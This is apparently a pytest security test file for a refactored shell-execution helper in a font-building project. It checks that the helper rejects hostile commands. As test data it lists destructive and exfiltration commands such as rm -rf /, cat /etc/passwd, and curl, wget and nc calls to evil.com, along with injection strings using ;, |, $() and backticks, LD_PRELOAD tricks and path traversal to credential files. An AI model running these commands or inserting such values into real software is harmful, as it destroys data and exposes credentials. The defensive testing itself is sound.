# -*- coding: utf-8 -*-
"""
Security tests for shell command execution.

These tests verify that the refactored shell utilities prevent
command injection and other security vulnerabilities that existed
in the legacy shell.py implementation.
"""

import subprocess
from pathlib import Path

import pytest

from refactored.utils.shell_utils import (
    SecurityError,
    ShellExecutor,
    safe_command_execution,
)


class TestShellSecurity:
    """Test shell command security measures."""

    @pytest.mark.security
    def test_command_injection_prevention(self, sample_malicious_commands):
        """Test that command injection attacks are prevented."""
        executor = ShellExecutor()

        for malicious_cmd in sample_malicious_commands:
            with pytest.raises(SecurityError):
                # All malicious commands should be rejected
                safe_command_execution(malicious_cmd)

    @pytest.mark.security
    def test_safe_command_execution_list_format(self):
        """Test that safe commands in list format are executed properly."""
        # Test with a simple, safe command
        result = safe_command_execution(["echo", "hello"])
        assert result.returncode == 0
        assert b"hello" in result.stdout

    @pytest.mark.security
    def test_string_command_rejection(self):
        """Test that string commands are rejected to prevent injection."""
        with pytest.raises(SecurityError, match="String commands not allowed"):
            safe_command_execution("echo hello")

    @pytest.mark.security
    def test_shell_equals_true_prevention(self):
        """Test that shell=True is never used in subprocess calls."""
        # This test ensures that our safe_command_execution never uses shell=True
        executor = ShellExecutor()

        # Mock subprocess.run to verify shell=False is always used
        original_run = subprocess.run
        captured_calls = []

        def mock_run(*args, **kwargs):
            captured_calls.append(kwargs)
            # Simulate successful execution
            return type(
                "MockResult", (), {"returncode": 0, "stdout": b"success", "stderr": b""}
            )()

        subprocess.run = mock_run

        try:
            executor.execute(["echo", "test"])

            # Verify that shell=False was used
            assert len(captured_calls) == 1
            assert captured_calls[0].get("shell") is False

        finally:
            subprocess.run = original_run

    @pytest.mark.security
    def test_command_validation(self):
        """Test command validation logic."""
        # Safe commands should pass validation
        safe_commands = [
            ["otfccbuild", "input.json", "-o", "output.ttf"],
            ["python", "-m", "module"],
            ["jq", ".glyf"],
        ]

        for cmd in safe_commands:
            # Should not raise an exception
            safe_command_execution(cmd)

    @pytest.mark.security
    def test_dangerous_command_detection(self):
        """Test detection of dangerous command patterns."""
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["cat", "/etc/passwd"],
            ["curl", "http://evil.com"],
            ["wget", "http://evil.com/malware"],
            ["nc", "evil.com", "1234"],
            ["python", "-c", "import os; os.system('rm -rf /')"],
        ]

        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                safe_command_execution(cmd)

    @pytest.mark.security
    def test_path_traversal_in_commands(self, sample_path_traversal_attacks):
        """Test that path traversal attacks in commands are prevented."""
        for malicious_path in sample_path_traversal_attacks:
            with pytest.raises(SecurityError):
                safe_command_execution(["cat", malicious_path])

    @pytest.mark.security
    def test_environment_variable_injection(self):
        """Test that environment variable injection is prevented."""
        malicious_envs = [
            "PATH=/tmp/malicious:$PATH",
            "LD_PRELOAD=/tmp/malicious.so",
            "SHELL=/bin/bash -c 'rm -rf /'",
        ]

        for env_var in malicious_envs:
            with pytest.raises(SecurityError):
                # Commands that try to modify environment should be rejected
                safe_command_execution(["env", env_var, "echo", "test"])

    @pytest.mark.security
    def test_file_permission_validation(self, temp_dir):
        """Test that file permission validation works correctly."""
        # Create test files with different permissions
        safe_file = temp_dir / "safe_file.txt"
        safe_file.write_text("safe content")
        safe_file.chmod(0o644)

        restricted_file = temp_dir / "restricted_file.txt"
        restricted_file.write_text("restricted content")
        restricted_file.chmod(0o600)

        executor = ShellExecutor()

        # Reading safe file should work
        result = executor.execute(["cat", str(safe_file)])
        assert result.returncode == 0

        # Accessing restricted file should be limited
        # Note: This depends on the current user's permissions
        try:
            result = executor.execute(["cat", str(restricted_file)])
            # May succeed if user has permissions, that's okay
        except SecurityError:
            # Expected if security policies prevent access
            pass

    @pytest.mark.security
    def test_timeout_enforcement(self):
        """Test that command timeouts are enforced."""
        executor = ShellExecutor()

        # Test with a command that should timeout
        with pytest.raises(subprocess.TimeoutExpired):
            executor.execute(["sleep", "10"], timeout=1)

    @pytest.mark.security
    def test_working_directory_restriction(self, temp_dir):
        """Test that working directory is restricted appropriately."""
        executor = ShellExecutor()

        # Should be able to work in project directory
        result = executor.execute(["pwd"], cwd=str(temp_dir))
        assert result.returncode == 0

        # Should not be able to work in system directories
        system_dirs = ["/etc", "/usr/bin", "/root"]
        for sys_dir in system_dirs:
            if Path(sys_dir).exists():
                with pytest.raises((SecurityError, PermissionError)):
                    executor.execute(["pwd"], cwd=sys_dir)

    @pytest.mark.security
    def test_legacy_shell_vulnerability_prevention(self):
        """Test that legacy shell.py vulnerabilities are prevented."""
        # Legacy shell.py used shell=True which was vulnerable to injection
        # This test ensures that common injection patterns are blocked

        injection_patterns = [
            ["otfccbuild", "input.json", "-o", "output.ttf", "&& rm -rf /"],
            ["otfccbuild", "input.json", "-o", "output.ttf", "|", "cat", "/etc/passwd"],
            [
                "otfccbuild",
                "input.json",
                "-o",
                "output.ttf",
                ";",
                "curl",
                "http://evil.com",
            ],
            ["otfccbuild", "$(cat /etc/passwd)", "-o", "output.ttf"],
            ["otfccbuild", "`cat /etc/passwd`", "-o", "output.ttf"],
        ]

        for pattern in injection_patterns:
            with pytest.raises(SecurityError):
                safe_command_execution(pattern)

    @pytest.mark.security
    def test_secure_temp_file_handling(self, temp_dir):
        """Test secure temporary file handling."""
        executor = ShellExecutor()

        # Create temporary files in secure location
        temp_file = temp_dir / "temp_secure.txt"
        temp_file.write_text("temporary data")

        # Should be able to access temp files in designated area
        result = executor.execute(["cat", str(temp_file)])
        assert result.returncode == 0

        # Should not be able to access system temp files
        system_temp_patterns = [
            "/tmp/../../etc/passwd",
            "/var/tmp/../../etc/passwd",
            "C:\\Windows\\Temp\\..\\..\\System32\\config\\SAM",
        ]

        for pattern in system_temp_patterns:
            with pytest.raises(SecurityError):
                executor.execute(["cat", pattern])


class TestShellExecutorSecurity:
    """Test ShellExecutor class security features."""

    @pytest.mark.security
    def test_executor_initialization(self):
        """Test that ShellExecutor initializes with secure defaults."""
        executor = ShellExecutor()

        # Should have secure default settings
        assert hasattr(executor, "timeout")
        assert hasattr(executor, "check_security")
        assert executor.timeout > 0  # Should have reasonable timeout

    @pytest.mark.security
    def test_executor_command_validation(self):
        """Test that ShellExecutor validates commands before execution."""
        executor = ShellExecutor()

        # Safe command should work
        result = executor.execute(["echo", "test"])
        assert result.returncode == 0

        # Dangerous command should be rejected
        with pytest.raises(SecurityError):
            executor.execute(["rm", "-rf", "/"])

    @pytest.mark.security
    def test_executor_output_sanitization(self):
        """Test that command output is properly sanitized."""
        executor = ShellExecutor()

        # Test with command that might output sensitive data
        result = executor.execute(["echo", "sensitive_data"])

        # Output should be captured but not logged unsafely
        assert result.returncode == 0
        assert b"sensitive_data" in result.stdout

        # Ensure no sensitive data is logged in clear text
        # This would require actual logging inspection in a real implementation

    @pytest.mark.security
    def test_executor_error_handling(self):
        """Test that executor handles errors securely."""
        executor = ShellExecutor()

        # Test with command that fails
        result = executor.execute(["false"])  # Command that always fails
        assert result.returncode != 0

        # Test with non-existent command
        with pytest.raises((SecurityError, FileNotFoundError)):
            executor.execute(["nonexistent_command_12345"])

    @pytest.mark.security
    def test_executor_resource_limits(self):
        """Test that executor enforces resource limits."""
        executor = ShellExecutor()

        # Test timeout enforcement
        with pytest.raises(subprocess.TimeoutExpired):
            executor.execute(["sleep", "5"], timeout=1)

        # Test memory limit (if implemented)
        # This would require actual memory monitoring in a real implementation
        # For now, we just ensure that large commands don't hang
        try:
            result = executor.execute(["echo", "x" * 1000], timeout=5)
            assert result.returncode == 0
        except (subprocess.TimeoutExpired, SecurityError):
            # Timeout or security rejection is acceptable for resource protection
            pass
